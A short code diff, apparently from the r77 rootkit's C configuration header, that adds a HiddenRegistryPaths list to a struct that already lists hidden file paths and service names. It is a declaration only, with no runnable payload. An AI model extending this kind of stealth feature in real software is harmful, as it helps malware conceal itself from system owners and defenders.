@@ -25,6 +25,10 @@ typedef struct _R77_CONFIG
 	/// </summary>
 	PSTRING_LIST HiddenPaths;
 	/// <summary>
+	/// A list of registry key or value full paths to hide in addition to registry keys and values hidden by the prefix.
+	/// </summary>
+	PSTRING_LIST HiddenRegistryPaths;
+	/// <summary>
 	/// A list of service names to hide in addition to services hidden by the prefix.
 	/// </summary>
 	PSTRING_LIST HiddenServiceNames;
